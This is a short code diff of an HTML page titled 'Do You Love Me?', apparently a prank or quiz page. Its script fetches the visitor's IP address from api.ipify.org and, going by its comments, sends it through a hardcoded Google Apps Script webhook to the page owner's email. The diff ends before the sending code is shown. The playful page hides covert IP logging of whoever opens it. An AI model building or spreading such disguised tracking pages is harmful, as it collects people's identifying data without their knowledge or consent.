@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>Do You Love Me?</title>
   <style>
     body {
@@ -43,10 +43,9 @@
   <h2 id="message"></h2>
 
   <script>
-    // YOUR Google Apps Script URL
+    // IP logging via Google Apps Script
     const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbyJbMUN18urZKeqrzcrb-HmN2XCOGr20Um1EuK5b_6bZ8_aMlAqwcUkBdnbfCLAHpQV/exec";
 
-    // Fetch IP then send to your email
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
       .then(data => {
